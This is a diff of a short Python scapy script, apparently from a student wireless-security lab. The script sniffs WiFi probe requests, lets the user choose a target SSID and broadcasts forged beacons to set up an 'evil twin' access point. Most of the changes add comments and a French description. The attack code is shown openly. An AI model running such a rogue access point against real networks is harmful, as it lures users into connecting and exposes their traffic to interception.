@@ -1,5 +1,8 @@
 # Authors : Delphine Scherler & Wenes Limem
 # Date : 31.03.2022
+# Description : Script qui permet la création d'un evil twin pour viser une cible que l'on découvre dynamiquement en
+# utilisant des probes
+
 
 from scapy.all import *
 from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11ProbeReq
@@ -7,8 +10,7 @@ from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Prob
 probes = {}
 
 
-
-# Find probes
+# find all probes
 def find_probes(pkt):
     if pkt.haslayer(Dot11ProbeReq):
         # extract the MAC address of the network
@@ -26,10 +28,7 @@ def find_probes(pkt):
             probes[essid] = [essid, ssid, channel]
 
 
-
-
-
-
+# method to generate beacon
 def generate_beacon(iface, ssid):
     sender_MAC = RandMAC()
     # 802.11 frame
@@ -42,15 +41,13 @@ def generate_beacon(iface, ssid):
 
 
 if __name__ == "__main__":
-
     # fixing interface and timeout
-    # interface name
     interface = "wlan0"
     t_out = input("Sniffing timeout: ")
 
     sniff(prn=find_probes, iface=interface, timeout=int(t_out))
     ssids = []
-	
+    # display all probes
     print("probes scanned:")
     cnt = 0
     for i in probes:
@@ -58,8 +55,9 @@ if __name__ == "__main__":
         ssids.append(probes.get(i)[0])
         print(cnt, probes.get(i))
 
-    # select target network
+    # user select target network
     tg_index = int(input("Tapez le numero de la cible : "))
     tg_ssid = ssids[int(tg_index - 1)]
 
+    # evil twin is generated
     generate_beacon(interface, tg_ssid)
